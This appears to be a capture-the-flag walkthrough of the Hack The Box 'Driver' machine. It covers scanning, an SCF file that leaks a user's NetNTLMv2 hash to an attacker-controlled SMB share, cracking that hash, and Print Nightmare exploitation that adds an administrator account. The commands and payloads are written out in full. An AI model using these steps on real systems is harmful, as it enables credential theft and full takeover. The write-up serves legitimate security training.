# [driver](https://app.hackthebox.com/machines/Driver)

> A Windows server of the **MFP Firmware Update Center**, an organization that tests printer firmware and drivers. The server hosts MFP's web application which is protected with HTTP Basic Authentication, but also discloses a username in the banner that also doubles as the password, effectively nullifying it. The web application contains a form to upload printer firmware updates that members of the MFP team "manually review." By uploading an SCF file with a link to an attacker-controlled SMB share, an MFP team member clicks the SCF file and discloses his NetNTLMv2 hash, which is crackable. The server is running the Windows Print Spooler service and with the MFP team member's credentials, it is possible to exploit the Print Nightmare vulnerability to achieve administrative access to the server.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.187.197 --rate=1000 -e tun0 --output-format grepable --output-filename enum/driver.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-27 03:45:29 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/driver.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,445,5985,80,
```

```bash
$ sudo nmap -sC -sV -O -p135,445,5985,80 10.129.187.197 -oA enum/driver
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 21:48 CST
Nmap scan report for 10.129.187.197
Host is up (0.066s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (90%), FreeBSD 6.X (86%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (87%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows Vista SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-27T10:49:13
|_  start_date: 2021-11-27T10:44:01
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.45 seconds
```

The open ports and their respective banners indicate the target is a Windows server. The banner for port 80 appears to disclose a potential username, `admin`. There may be accessible SMB shares on port 445 and remote command execution may be possible via WinRM on port 5985.

### UDP

There doesn't appear to be any significant UDP ports open.

```bash
$ sudo nmap -sU 10.129.187.197
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 22:55 CST
Nmap scan report for driver.htb (10.129.187.197)
Host is up (0.060s latency).
All 1000 scanned ports on driver.htb (10.129.187.197) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 62.03 seconds
```

---

## SMB Enumeration

Neither anonymous nor guest access is available on the target's SMB port.

```bash
$ smbmap -u "" -p "" -P 445 -H 10.129.187.197
[!] Authentication error on 10.129.187.197
```

```bash
$ smbmap -u "guest" -p "" -P 445 -H 10.129.187.197
[!] Authentication error on 10.129.187.197
```

---

## Web Enumeration

### Manual Enumeration

Upon browsing to the site, it immediately requires HTTP Basic Authentication and discloses the username `admin`. Attempting `admin`:`admin` is successful. 

The home page advertises the `MFP Firmware Update Center`, who "conducts various tests on multi-functional printers such as testing firmware updates, drivers, etc." The home page discloses the email address `support@driver.htb` and the hostname `driver.htb`. Add this hostname to the local DNS resolver.

![](images/Pasted%20image%2020211126215938.png)

The only navigation bar option that leads off the home page is `Firmware Updates`, which leads to `/fw_up.php`. This page is a form that allows users to upload "firmware updates" for various printer models to the MFP file share where their testing team will "manually review and test the uploaded firmware update."

![](images/Pasted%20image%2020211130153616.png)

### Content Discovery

```bash
$ gobuster dir -U admin -P admin -u http://driver.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://driver.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               admin
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/11/26 22:16:45 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 148] [--> http://driver.htb/images/]
/index.php            (Status: 200) [Size: 4279]
/Images               (Status: 301) [Size: 148] [--> http://driver.htb/Images/]
/.                    (Status: 200) [Size: 4279]
/Index.php            (Status: 200) [Size: 4279]
/IMAGES               (Status: 301) [Size: 148] [--> http://driver.htb/IMAGES/]
/INDEX.php            (Status: 200) [Size: 4279]

===============================================================
2021/11/26 22:27:40 Finished
===============================================================
```

### Virtual Host Discovery

```bash
$ gobuster vhost -U admin -P admin -u http://driver.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://driver.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Auth User:    admin
[+] Timeout:      10s
===============================================================
2021/11/26 22:33:50 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/11/26 22:34:34 Finished
===============================================================
```

---

## Uploading an SCF File

Since the uploaded "firmware update" is written to a file share and then "manually reviewed" by someone from the MFP team, it may be possible to upload an SCF file with a link to the attacking machine's SMB share. When a member of the MFP team opens the file, it will attempt to authenticate to the attacking machine's SMB server and reveal the user's NetNTLMv2 hash.

Start `responder`.

```bash
$ sudo responder -I tun0 -rv                                                                                                                          1 ⨯
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.74]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-I1RDJCZKRTI]
    Responder Domain Name      [UPYC.LOCAL]
    Responder DCE-RPC Port     [48160]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...
```

Create the malicious SCF file.

```bash
$ cat tgihf.scf
[Shell]
Command=2
IconFile=\\10.10.14.74\tgihf\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Upload the malicious SCF file to the firmware update upload form.

![](images/Pasted%20image%2020211130152541.png)

The request:

```http
POST /fw_up.php HTTP/1.1
Host: 10.129.189.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------67854454927506054402518012571
Content-Length: 452
Origin: http://10.129.189.210
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://10.129.189.210/fw_up.php
Upgrade-Insecure-Requests: 1

-----------------------------67854454927506054402518012571
Content-Disposition: form-data; name="printers"

HTB DesignJet
-----------------------------67854454927506054402518012571
Content-Disposition: form-data; name="firmware"; filename="tgihf.scf"
Content-Type: application/octet-stream

[Shell]
Command=2
IconFile=\\10.10.14.74\tgihf\icon.ico
[Taskbar]
Command=ToggleDesktop


-----------------------------67854454927506054402518012571--
```

Successful response:

```http
HTTP/1.1 302 Found
Content-Type: text/html; charset=UTF-8
Location: fw_up.php?msg=SUCCESS
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.25
Date: Wed, 01 Dec 2021 03:25:56 GMT
Connection: close
Content-Length: 1
```

The user `tony` clicks on the SCF file, and `responder` captures and reveals his NetNTLMv2 hash.

```txt
...[SNIP]...
[SMB] NTLMv2-SSP Client   : 10.129.189.210
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:80a2d20c9b4107fa:C96B6CEC0B4792AF1039B40FE37EC11A:010100000000000000C4C43FFFE5D7013DB7AEE6CD9612C70000000002000800470053004E00550001001E00570049004E002D00470058004F0044005000330031004F0046003200430004003400570049004E002D00470058004F0044005000330031004F004600320043002E00470053004E0055002E004C004F00430041004C0003001400470053004E0055002E004C004F00430041004C0005001400470053004E0055002E004C004F00430041004C000700080000C4C43FFFE5D70106000400020000000800300030000000000000000000000000200000B7E38560BD31A186B7A95BA8E0AC152B549428C59A73176D454861DAE26BE3300A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0037003400000000000000000000000000
...[SNIP]...
```

Crack the hash.

```bash
$ hashcat -m 5600 'tony::DRIVER:80a2d20c9b4107fa:C96B6CEC0B4792AF1039B40FE37EC11A:010100000000000000C4C43FFFE5D7013DB7AEE6CD9612C70000000002000800470053004E00550001001E00570049004E002D00470058004F0044005000330031004F0046003200430004003400570049004E002D00470058004F0044005000330031004F004600320043002E00470053004E0055002E004C004F00430041004C0003001400470053004E0055002E004C004F00430041004C0005001400470053004E0055002E004C004F00430041004C000700080000C4C43FFFE5D70106000400020000000800300030000000000000000000000000200000B7E38560BD31A186B7A95BA8E0AC152B549428C59A73176D454861DAE26BE3300A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0037003400000000000000000000000000' rockyou.txt
TONY::DRIVER:80a2d20c9b4107fa:c96b6cec0b4792af1039b40fe37ec11a:010100000000000000c4c43fffe5d7013db7aee6cd9612c70000000002000800470053004e00550001001e00570049004e002d00470058004f0044005000330031004f0046003200430004003400570049004e002d00470058004f0044005000330031004f004600320043002e00470053004e0055002e004c004f00430041004c0003001400470053004e0055002e004c004f00430041004c0005001400470053004e0055002e004c004f00430041004c000700080000c4c43fffe5d70106000400020000000800300030000000000000000000000000200000b7e38560bd31a186b7a95ba8e0ac152b549428c59a73176d454861dae26be3300a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003400000000000000000000000000:liltony
```

`tony`'s password is `liltony`.

---

## WinRM Access as `tony`

The target is serving WinRM. Log in as `tony` and grab the user flag.

```bash
$ evil-winrm -i 10.129.189.210 -u tony -p liltony

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for Reline:Module

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> ls ../Desktop


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/30/2021   6:40 PM             34 user.txt
```

---

## Local Privilege Escalation Enumeration as `tony`

Leverage the WinRM access as `tony` to learn more about the system. Looking at the information in `tony`'s current access token, it doesn't appear he is in a privileged group, the current process is running with medium integrity, and he doesn't have any significant privileges.

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
driver\tony S-1-5-21-3114857038-1253923253-2196841645-1003


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

None of the running processes appear of any significance.

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> ps

Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
-------  ------    -----      ----- -----   ------     -- -----------
     40       4     1828       1396 ...67     0.80   2600 cmd
    113      10    10396       6748 ...45     1.16   2580 conhost
    309      13     1172       4176 ...03             344 csrss
    258      18     1180       4052 ...08             464 csrss
    200      13     3304      11984 ...02            2172 dllhost
    331      27    27912      46320 ...96             808 dwm
    509      27     8644      30764 ...32     0.28   1328 explorer
    484      26     8620      30708 ...31     0.33   2668 explorer
   1416      59    16708      61856 ...66     9.61   3176 explorer
    536      34     9996      35056 ...45     0.27   5036 explorer
      0       0        0          4     0               0 Idle
   1007      23     5380      15104 ...01             580 lsass
    173      13     2360       8832 ...95            2440 msdtc
    477      38    15164      43312   299     0.91   4548 OneDrive
     55       6      716       3312 ...65     0.02   3668 PING
    241      17     4224      20804 ...76     0.13   3232 RuntimeBroker
    700      52    21832      26612 ...43            2732 SearchIndexer
    758      48    30076      71324 33073     0.70   3804 SearchUI
    187      12     2740      10536 ...02             896 sedsvc
    249      10     2600       6372 ...74             572 services
    638      31    13984      46468   251     0.61   3516 ShellExperienceHost
    344      15     3688      17864 ...47     0.59   2576 sihost
     49       3      336       1168 ...56             268 smss
    379      22     5052      13772 ...12            1264 spoolsv
    675      48     7724      20240 ...31              72 svchost
    760      27     6112      14236 ...39             292 svchost
    529      20     4920      16920 ...16             664 svchost
    515      16     3276       8792 ...90             716 svchost
   1273      52    14604      36184 ...22             836 svchost
    573      27    11252      18160 ...37             860 svchost
    223      17     2132       8428 ...98             884 svchost
    422      21     4776      17660 ...46             964 svchost
    491      42    12592      22560 ...64            1420 svchost
    126      11     3052       9240 ...97            1536 svchost
    294      20     5208      19224 ...14            1552 svchost
    172      12     2072      12308 ...26     0.00   1568 svchost
    189      15     3432       9912 ...04            1656 svchost
    177      14     3452      14916 ...56            1664 svchost
    116       9     1268       6120 ...77            2536 svchost
     99       7     1140       5924 ...87            3784 svchost
    870       0      124        140     3               4 System
    273      27     4528      13268 ...16     0.25    804 taskhostw
    138      11     2672      10396 ...22            1756 VGAuthService
    108       7     1304       5520 ...06            1684 vm3dservice
    100       8     1376       6028 ...28            1984 vm3dservice
    332      23     8908      21092 ...52            1692 vmtoolsd
    211      18     4924      15116 ...67     0.36   4512 vmtoolsd
    216      21     4972      13012 ...11            2388 w3wp
     85       8      816       4664 ...73             456 wininit
    181       9     1824       8724 ...22             508 winlogon
    330      19     8028      18132 ...96            2396 WmiPrvSE
    877      33    69424      92404 ...71     1.80   3216 wsmprovhost
    219      10     1556       7144 ...92             644 WUDFHost
```

No new network interfaces.

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DRIVER
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-20-FF
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::182e:1ba9:7b17:351d%5(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.189.210(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Tuesday, November 30, 2021 6:40:11 PM
   Lease Expires . . . . . . . . . . : Tuesday, November 30, 2021 7:55:30 PM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 50352214
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-38-98-D7-00-50-56-B9-20-FF
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

Looking at the active network connections, it appears the initial `nmap` scan missed some ports. Specifically, ports `47001` through `49413`. According to [this Microsoft technet post](https://social.technet.microsoft.com/Forums/en-US/8fa8db30-ed33-46bc-ba67-aa8061333cc4/print-spooler-network-ports-and-firewall-what-does-the-tcp-49159-port-do?forum=winserverprint), the Print Spooler service runs one random ports in the range `49152` and `65535`. Several of the ports fall in this range, indicating the server may be running the Print Spooler service. The theme of the box itself would indicate this as well.

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49408          0.0.0.0:0              LISTENING       456
  TCP    0.0.0.0:49409          0.0.0.0:0              LISTENING       860
  TCP    0.0.0.0:49410          0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:49411          0.0.0.0:0              LISTENING       1264
  TCP    0.0.0.0:49412          0.0.0.0:0              LISTENING       572
  TCP    0.0.0.0:49413          0.0.0.0:0              LISTENING       580
  TCP    10.129.189.210:139     0.0.0.0:0              LISTENING       4
  TCP    10.129.189.210:5985    10.10.14.74:56732      TIME_WAIT       0
  TCP    10.129.189.210:5985    10.10.14.74:56734      ESTABLISHED     4
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       716
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49408             [::]:0                 LISTENING       456
  TCP    [::]:49409             [::]:0                 LISTENING       860
  TCP    [::]:49410             [::]:0                 LISTENING       836
  TCP    [::]:49411             [::]:0                 LISTENING       1264
  TCP    [::]:49412             [::]:0                 LISTENING       572
  TCP    [::]:49413             [::]:0                 LISTENING       580
  UDP    0.0.0.0:5353           *:*                                    72
  UDP    0.0.0.0:5355           *:*                                    72
  UDP    0.0.0.0:57943          *:*                                    72
  UDP    10.129.189.210:137     *:*                                    4
  UDP    10.129.189.210:138     *:*                                    4
  UDP    10.129.189.210:1900    *:*                                    884
  UDP    10.129.189.210:57470   *:*                                    884
  UDP    127.0.0.1:1900         *:*                                    884
  UDP    127.0.0.1:57471        *:*                                    884
  UDP    [::]:5353              *:*                                    72
  UDP    [::]:5355              *:*                                    72
  UDP    [::]:57943             *:*                                    72
  UDP    [::1]:1900             *:*                                    884
  UDP    [::1]:57469            *:*                                    884
  UDP    [fe80::182e:1ba9:7b17:351d%5]:1900  *:*                                    884
  UDP    [fe80::182e:1ba9:7b17:351d%5]:57468  *:*                                    884
```

---

## Print Nightmare Privilege Escalation

Since the server appears to be running the Print Spooler service, it may be vulnerable to the [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527), the Print Nightmare vulnerability, which allows an authenticated user to locally or remotely run arbitrary code as `SYSTEM` on the target machine. Use `impacket-rpcdump` to confirm the `MS-RPRN` service is running.

```bash
$ impacket-rpcdump tony:liltony@10.129.189.210 | grep MS-RPRN -A 6
Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
Bindings:
          ncacn_ip_tcp:10.129.189.210[49411]
          ncalrpc:[LRPC-789317d6a26bbf1c3e]
```

Use `evil-winrm` to remote into the target as `tony` via WinRM, making the [CVE-2021-34527 Github repository](https://github.com/calebstewart/CVE-2021-34527) available to the current PowerShell session with the `-s` flag. Import `CVE-2021-34527.ps1` from that repository into the current PowerShell session and exploit the vulnerability to create a new administrator user, `tgihf`.

```powershell
$ evil-winrm -i 10.129.189.210 -u tony -p liltony -s /opt/CVE-2021-34527/ 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for Reline:Module

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> CVE-2021-34527.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser tgihf -NewPassword 'P@$$w0rd1'
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user tgihf as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Log in as `tgihf`and read the system flag.

```powershell
$ evil-winrm -i 10.129.189.210 -u tgihf -p 'P@$$w0rd1'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for Reline:Module

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tgihf\Documents> ls C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/30/2021   6:40 PM             34 root.txt
```
